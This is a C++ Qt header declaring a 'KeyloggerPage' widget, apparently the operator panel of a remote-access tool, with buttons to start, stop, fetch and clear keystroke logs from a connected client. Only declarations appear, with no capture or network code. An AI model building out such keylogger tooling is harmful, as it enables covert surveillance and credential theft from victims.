#ifndef KEYLOGGERPAGE_H
#define KEYLOGGERPAGE_H

#include <QWidget>
#include <QTextEdit>
#include <QPushButton>
#include <QVBoxLayout>
#include <QHBoxLayout>
#include <QLabel>

#include "../../Common/Packet.h"
#include "../../Common/Protocol.h"

class ClientSocket;

class KeyloggerPage : public QWidget
{
    Q_OBJECT

public:
    explicit KeyloggerPage(QWidget *parent = nullptr);

    void setClientSocket(ClientSocket* socket);
    void handleResponse(const Packet& packet);

private slots:
    void onStartClicked();
    void onStopClicked();
    void onGetDataClicked();
    void onClearClicked();

private:
    void setupUI();

    QTextEdit* textDisplay;
    QPushButton* btnStart;
    QPushButton* btnStop;
    QPushButton* btnGetData;
    QPushButton* btnClear;
    QLabel* statusLabel;

    ClientSocket* clientSocket;
};

#endif // KEYLOGGERPAGE_H
